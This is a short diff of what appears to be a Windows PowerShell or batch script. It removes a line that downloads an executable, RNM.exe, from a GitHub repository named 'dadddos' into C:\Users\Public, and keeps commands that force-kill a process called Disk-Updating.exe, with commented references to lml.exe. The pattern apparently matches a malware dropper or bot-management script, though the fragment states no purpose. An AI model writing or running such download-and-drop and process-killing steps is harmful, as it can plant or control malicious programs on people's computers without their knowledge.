@@ -1,4 +1,3 @@
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\Users\Public\RNM.exe
 taskkill /F /IM Disk-Updating.exe
 #taskkill /F /IM lml.exe
 #C:\Users\seba\Downloads\lml.exe
